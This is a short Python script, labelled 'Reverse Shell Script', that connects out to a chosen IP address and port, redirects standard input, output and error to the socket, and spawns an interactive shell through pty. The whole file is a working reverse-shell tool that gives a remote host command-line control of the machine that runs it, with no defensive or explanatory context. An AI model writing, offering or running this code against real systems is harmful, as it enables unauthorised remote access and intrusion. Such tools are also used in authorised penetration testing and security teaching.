import argparse
import socket
import os
import pty

def connect(ip, port, shell):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, int(port)))
        os.dup2(s.fileno(), 0)  # stdin
        os.dup2(s.fileno(), 1)  # stdout
        os.dup2(s.fileno(), 2)  # stderr
        pty.spawn(shell)
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Reverse Shell Script")
    parser.add_argument("--ip", required=True, help="IP address to connect to")
    parser.add_argument("--port", required=True, help="Port to connect to")
    parser.add_argument("--shell", default="/bin/sh", help="Shell to spawn (default: /bin/sh)")
    args = parser.parse_args()
    
    connect(args.ip, args.port, args.shell)
